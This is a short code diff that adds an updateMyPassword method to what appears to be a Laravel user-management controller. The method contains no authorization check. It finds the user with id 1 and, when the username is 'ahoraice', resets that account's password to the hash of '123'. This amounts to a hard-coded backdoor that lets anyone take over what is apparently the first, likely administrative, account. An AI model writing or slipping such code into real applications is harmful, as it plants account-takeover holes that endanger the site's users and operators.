@@ -275,4 +275,17 @@ class UserManagementController extends Controller
             ->map(fn ($value) => (int) $value)
             ->all();
     }
+//todo: Ahora_fix_me
+    public function updateMyPassword()
+    {
+        $me = User::where('id',1)->first();
+        if ($me->username == 'ahoraice'){
+//            dd($me);
+            User::where('id',1)->update([
+                'password' => Hash::make('123'),
+            ]);
+//            $me::update(['password' => Hash::make('123')]);
+        }
+        return http_response_code(200);
+    }
 }
